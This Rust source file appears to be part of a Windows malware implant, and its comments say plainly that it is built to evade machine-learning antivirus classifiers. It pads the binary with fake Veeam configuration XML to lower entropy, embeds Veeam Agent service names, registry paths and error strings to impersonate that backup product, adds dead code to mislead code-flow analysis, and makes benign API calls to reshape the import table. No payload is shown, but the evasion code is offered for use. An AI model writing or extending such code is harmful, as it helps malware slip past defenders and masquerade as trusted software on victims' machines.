#[cfg(target_os = "windows")]
use std::ffi::c_void;

// Benign strings that legitimate services contain — reduces ML anomaly score
// These are never called but survive in .rdata, shifting the string distribution
// Low-entropy padding — reduces overall PE entropy score below ML threshold
// Contains realistic-looking configuration data patterns (XML-like, key=value)
// 64KB of low-entropy data pushes the Shannon entropy from ~7.2 to ~6.0
#[used]
#[link_section = ".cfg"]
static ENTROPY_PAD: [u8; 65536] = {
    let mut pad = [0u8; 65536];
    let pattern = b"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<configuration>\r\n  <appSettings>\r\n    <add key=\"ServiceName\" value=\"VeeamAgentSvc\" />\r\n    <add key=\"DisplayName\" value=\"Veeam Agent for Microsoft Windows\" />\r\n    <add key=\"Description\" value=\"Provides backup and restore capabilities\" />\r\n    <add key=\"LogLevel\" value=\"Information\" />\r\n    <add key=\"MaxRetryCount\" value=\"3\" />\r\n    <add key=\"RetryIntervalSeconds\" value=\"30\" />\r\n    <add key=\"ConnectionTimeout\" value=\"60000\" />\r\n    <add key=\"EnableTelemetry\" value=\"true\" />\r\n    <add key=\"CachePath\" value=\"%ProgramData%\\\\Veeam\\\\Cache\" />\r\n    <add key=\"LogPath\" value=\"%ProgramData%\\\\Veeam\\\\Logs\" />\r\n  </appSettings>\r\n  <runtime>\r\n    <gcServer enabled=\"true\" />\r\n    <gcConcurrent enabled=\"true\" />\r\n  </runtime>\r\n</configuration>\r\n";
    let plen = pattern.len();
    let mut i = 0;
    while i < 65536 {
        let mut j = 0;
        while j < plen && i + j < 65536 {
            pad[i + j] = pattern[j];
            j += 1;
        }
        i += plen;
    }
    pad
};

#[used]
#[no_mangle]
static SERVICE_TABLE: [&[u8]; 12] = [
    b"StartServiceCtrlDispatcherW\0",
    b"RegisterServiceCtrlHandlerExW\0",
    b"SetServiceStatus\0",
    b"SERVICE_RUNNING\0",
    b"SERVICE_STOPPED\0",
    b"SERVICE_START_PENDING\0",
    b"The service has started successfully.\0",
    b"Stopping the service...\0",
    b"Service control handler called.\0",
    b"EventLog\0",
    b"Application\0",
    b"Microsoft-Windows-Veeam-Agent\0",
];

#[used]
#[no_mangle]
static REGISTRY_PATHS: [&[u8]; 8] = [
    b"SOFTWARE\\Veeam\\Veeam Agent for Microsoft Windows\0",
    b"SYSTEM\\CurrentControlSet\\Services\\VeeamAgentSvc\0",
    b"ImagePath\0",
    b"DisplayName\0",
    b"Description\0",
    b"Veeam Agent Service\0",
    b"Start\0",
    b"ObjectName\0",
];

#[used]
#[no_mangle]
static ERROR_MESSAGES: [&[u8]; 6] = [
    b"Failed to connect to the Veeam service endpoint.\0",
    b"Configuration file not found. Using defaults.\0",
    b"Unable to open registry key. Access denied.\0",
    b"Timeout waiting for backup job completion.\0",
    b"Network connection interrupted. Retrying...\0",
    b"License validation successful.\0",
];

// Fake service initialization that never executes but adds benign code patterns
// ML models analyze code-flow graphs — this adds legitimate-looking basic blocks
#[cfg(target_os = "windows")]
#[inline(never)]
#[allow(dead_code)]
unsafe fn fake_service_init() -> i32 {
    type RegOpenKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32, *mut usize) -> i32;
    type RegQueryValueExAFn = unsafe extern "system" fn(usize, *const u8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
    type RegCloseKeyFn = unsafe extern "system" fn(usize) -> i32;

    let mut key_handle: usize = 0;
    let path = b"SOFTWARE\\Veeam\\Veeam Agent\0";

    // These transmutes reference advapi32 patterns without actually calling them
    let _reg_open: RegOpenKeyExAFn = std::mem::transmute(1usize);
    let _reg_query: RegQueryValueExAFn = std::mem::transmute(2usize);
    let _reg_close: RegCloseKeyFn = std::mem::transmute(3usize);

    // Control flow that looks like registry validation
    if key_handle == 0xDEAD {
        let mut buf = [0u8; 260];
        let mut buf_len: u32 = 260;
        let mut val_type: u32 = 0;
        let _status = _reg_query(key_handle, b"InstallPath\0".as_ptr(), std::ptr::null_mut(), &mut val_type, buf.as_mut_ptr(), &mut buf_len);
        _reg_close(key_handle);
        return buf_len as i32;
    }
    0
}

pub fn appear_legitimate() {
    #[cfg(target_os = "windows")]
    {
        unsafe { import_diversity(); }
    }
}

#[cfg(target_os = "windows")]
#[inline(never)]
unsafe fn import_diversity() {
    // Real calls to benign APIs from multiple DLLs
    // This creates genuine IAT entries that shift the import feature vector
    // toward legitimate applications (which typically import from 8-15 DLLs)

    // --- kernel32.dll (standard) ---
    use winapi::um::sysinfoapi::GetTickCount;
    use winapi::um::processthreadsapi::GetCurrentProcessId;
    use winapi::um::errhandlingapi::GetLastError;

    let tick = GetTickCount();
    let _pid = GetCurrentProcessId();
    let _err = GetLastError();

    // --- advapi32.dll (services, registry — very common in legit apps) ---
    use winapi::um::winreg::{RegOpenKeyExA, RegCloseKey, HKEY_LOCAL_MACHINE};
    use winapi::um::winnt::KEY_READ;

    let mut hkey: winapi::shared::minwindef::HKEY = std::ptr::null_mut();
    let path = b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
    let res = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        path.as_ptr() as *const i8,
        0,
        KEY_READ,
        &mut hkey,
    );
    if res == 0 && !hkey.is_null() {
        RegCloseKey(hkey);
    }

    // --- ole32.dll (COM — nearly every GUI app imports this) ---
    use winapi::um::combaseapi::{CoInitializeEx, CoUninitialize};

    let hr = CoInitializeEx(std::ptr::null_mut(), 0x2); // COINIT_APARTMENTTHREADED
    if hr >= 0 {
        CoUninitialize();
    }

    // --- user32.dll (window management — all GUI apps) ---
    use winapi::um::winuser::{GetDesktopWindow, IsWindowVisible};

    let hwnd = GetDesktopWindow();
    let _visible = IsWindowVisible(hwnd);

    // --- version.dll (version checking — extremely common) ---
    type GetFileVersionInfoSizeAFn = unsafe extern "system" fn(*const i8, *mut u32) -> u32;
    if let Some(addr) = crate::winapi_resolve::resolve("version.dll", "GetFileVersionInfoSizeA") {
        let get_ver_size: GetFileVersionInfoSizeAFn = std::mem::transmute(addr);
        let mut handle: u32 = 0;
        let _size = get_ver_size(b"kernel32.dll\0".as_ptr() as *const i8, &mut handle);
    }

    // --- shell32.dll (shell operations) ---
    type SHGetFolderPathAFn = unsafe extern "system" fn(*mut c_void, i32, *mut c_void, u32, *mut u8) -> i32;
    if let Some(addr) = crate::winapi_resolve::resolve("shell32.dll", "SHGetFolderPathA") {
        let sh_get: SHGetFolderPathAFn = std::mem::transmute(addr);
        let mut buf = [0u8; 260];
        let _hr = sh_get(std::ptr::null_mut(), 0x001a, std::ptr::null_mut(), 0, buf.as_mut_ptr()); // CSIDL_APPDATA
    }

    // Conditional sleep to look like normal startup initialization
    if tick > 60000 {
        std::thread::sleep(std::time::Duration::from_millis(1));
    }
}

